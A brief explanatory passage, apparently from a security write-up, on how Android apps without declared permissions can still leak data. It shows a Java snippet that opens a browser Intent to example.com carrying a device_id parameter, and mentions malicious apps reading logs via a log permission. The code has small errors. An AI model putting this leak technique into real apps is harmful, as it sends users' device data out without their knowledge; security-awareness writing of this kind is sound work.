The permissions in Android devices are designed to guarantee that those 
Android apps without any declared
permissions cannot do anything harmful to the mobile device. Or can they?

Intent intent =new Intent(Intent.ACTION.VIEW,
Uri.parse("http://example.com/?device_id=xxx");
startActivity(intent);


To read the logs, an app will only need to request android.permission.READ_LOG
This can read by malicious apps for critical information
